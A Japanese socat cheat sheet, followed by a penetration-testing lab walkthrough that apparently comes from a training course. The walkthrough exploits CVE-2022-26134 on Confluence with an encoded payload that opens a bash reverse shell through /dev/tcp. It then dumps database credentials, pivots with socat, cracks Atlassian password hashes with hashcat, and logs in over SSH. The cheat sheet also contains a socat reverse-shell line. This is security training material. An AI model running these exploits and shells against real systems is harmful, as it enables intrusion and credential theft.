---
tags:
  - Linux
---
## 概要
socat は「Socket CAT」の略で、汎用ネットワークツールです。ポートフォワーディング、プロキシ、トンネリング、リダイレクトなど、様々な用途に使えます。

# ✅ よく使う socat コマンド例一覧
## 🔁 1. ポートフォワーディング（ローカルポート → リモート）
```bash
socat TCP-LISTEN:1234,fork TCP:192.168.1.10:80
```
localhost:1234 にアクセスすると 192.168.1.10:80 に転送

## ⬅️ 2. リバースシェル（サーバー側で待ち受け）
```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```
ターゲット側（クライアント）で：

bash


socat TCP:attacker_ip:4444 EXEC:/bin/bash
## 🔄 3. シリアルポート ↔ TCP 接続
bash


socat /dev/ttyUSB0,raw,echo=0 TCP:192.168.1.5:23
## 🔧 4. ローカル UNIX ドメインソケット作成
bash


socat UNIX-LISTEN:/tmp/mysocket,fork EXEC:/usr/bin/myapp
## 🔁 5. 任意の TCP <-> TCP ブリッジ
bash


socat TCP-LISTEN:9000,fork TCP:example.com:443
## 🧪 6. HTTPS 通信のトンネル（証明書無視）
bash


socat - OPENSSL:example.com:443,verify=0
## 🔥 7. socat で SOCKS プロキシ経由通信
bash


socat TCP-LISTEN:8080,fork SOCKS4A:127.0.0.1:target.com:80,socksport=9050
※ Tor 通信などに使える

## 📚 socat オプション解説
オプション	説明
fork	クライアントごとに新しいプロセス
reuseaddr	ソケット再利用を許可
TCP-LISTEN	待ち受けソケットを作る
EXEC:	コマンドを実行して stdin/stdout に接続
OPENSSL:	SSL/TLS 経由で接続する

## 🔍 補足
socat はデバッグ用に -d -d オプションで詳細ログが出せます。

man socat で詳細マニュアルが見られますが、非常に長いので用途別に調べるのが効率的です。

---
# 現在起動中のsocat

現在起動中の socat プロセスを確認するには、以下のコマンドを使います：
```bash
ps aux | grep '[s]ocat'
```

またはより詳しい情報を得たい場合：
```bash
pgrep -a socat
```

それぞれの意味：
ps aux | grep '[s]ocat'：socat を含むプロセス一覧を表示します（grep socat だとそのコマンド自身も引っかかるが、[s]ocat にすることで回避）。

pgrep -a socat：実行中の socat プロセスのPIDとコマンドラインを表示します。

例：
```bash
$ ps aux | grep '[s]ocat'
root      12345  0.0  0.1   9100   500 pts/0    S+   21:01   0:00 socat TCP-LISTEN:8080,fork EXEC:/bin/bash
```
もし何も表示されない場合は、現在 socat は起動していません。

---
# 停止
socat を停止するには、プロセスID（PID）を特定して kill します。

起動中の socat プロセスを確認
```bash
pgrep -a socat
```

```bash
12345 socat TCP-LISTEN:8080,fork EXEC:/bin/bash
```

プロセスを停止
```bash
kill 12345
```

強制終了したい場合：
```bash
kill -9 12345
```

複数の socat が起動している場合は、すべてのPIDを kill してください。
```bash
pkill socat
```
で一括停止も可能です（注意して使用してください）。

# Walkthrough

```zsh
# 01_Simple_Sinario
```


![[Pasted image 20261128055152.png]]

- Kali 192.168.45.195
- CONFULENCE01 192.168.162.63
- PGDATABASE01 10.4.162.215

CONFLUENCE01 は WAN と DMZ の両方にまたがっており、両方のネットワークで通信できることを示しています。
また、CONFLUENCE01 は TCP ポート 8090 もリッスンしており、アイコンに「オープンソケット」が表示されています。

PGDATABASE01はDMZネットワーク境界内にあり、WAN/DMZをまたいでいません。
KaliマシンはDMZ内にないため、PGDATABASE01に直接ルーティングすることはできません。
また、PGDATABASE01には「オープンソケット」が接続されており、TCPポート5432で何かがリッスンしていることを示しています（デフォルトポートは5432なので、これはPostgreSQLサーバーである可能性が高いです）。

## CONFLUENCE01への侵入
 CVE-2022-26134
```bash
curl http://192.168.162.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.195/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

```bash
rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.45.195] from (UNKNOWN) [192.168.162.63] 51238
bash: cannot set terminal process group (2206): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$
```

```
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

```
ip addr
4:ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    inet 192.168.162.63/24 brd 192.168.162.255 scope global ens192
5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    inet 10.4.162.63/24 brd 10.4.162.255 scope global ens224
```

```
ip route
10.4.162.0/24 dev ens224 proto kernel scope link src 10.4.162.63 
192.168.162.0/24 dev ens192 proto kernel scope link src 192.168.162.63
```

```
cat /var/atlassian/application-data/confluence/confluence.cfg.xml
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.162.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
```

## Socatによるポート転送

![[Pasted image 20261128055318.png]]

### Socat の起動

`CONFLUNCE01`

```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.162.215:5432
```

### PostgresSQLへのアクセス

`Kali`

```bash
psql -h 192.168.162.63 -p 2345 -U postgres
D@t4basePassw0rd!

\l
```

![[Pasted image 20261128055324.png]]

```bash
\c confluence
```
![[Pasted image 20261128055334.png]]

```bash
select * from cwd_user;
```
![[Pasted image 20261128055338.png]]

## Password_Crack
```bash
cat hashes.txt           
{PKCS5S2}3vfgC35A7Gnrxlzbvp32yM8zXvdE8U8bxS9bkP+3aS3rnSJxz4bJ6wqtE8d95ejA
{PKCS5S2}tnbti4h38VDOh0xPrBHr7JBYjev7wws+ETHL1YyjSpIWVUz+66zXwDvbBJkJz342
{PKCS5S2}1hCLEv054BGYa9QkCAZKSmotKb4d8WbuDc/gGxHngs0cL3+fJ4OmCt6+fUM6HYlc
{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R
{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv
{PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP
```

```zsh
 hashid hashes.txt
                                          
--File 'hashes.txt'--
Analyzing '{PKCS5S2}3vfgC35A7Gnrxlzbvp32yM8zXvdE8U8bxS9bkP+3aS3rnSJxz4bJ6wqtE8d95ejA'
[+] PBKDF2(Atlassian) 
Analyzing '{PKCS5S2}tnbti4h38VDOh0xPrBHr7JBYjev7wws+ETHL1YyjSpIWVUz+66zXwDvbBJkJz342'
[+] PBKDF2(Atlassian) 
Analyzing '{PKCS5S2}1hCLEv054BGYa9QkCAZKSmotKb4d8WbuDc/gGxHngs0cL3+fJ4OmCt6+fUM6HYlc'
[+] PBKDF2(Atlassian) 
Analyzing '{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R'
[+] PBKDF2(Atlassian) 
Analyzing '{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv'
[+] PBKDF2(Atlassian) 
Analyzing '{PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP'
[+] PBKDF2(Atlassian) 
--End of file 'hashes.txt'--  
```

```zsh
hashcat -h | grep Atlassian                                   
  12001 | Atlassian (PBKDF2-HMAC-SHA1)                               | Framework
```

```zsh
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R:Welcome1234
{PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP:P@ssw0rd!
{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv:sqlpass123
```

Victim
```bash
socat TCP-LISTEN:2222,fork TCP:10.4.162.215:22
```

Kali
```bash
ssh database_admin@192.168.162.63 -p2222
sqlpass123
```
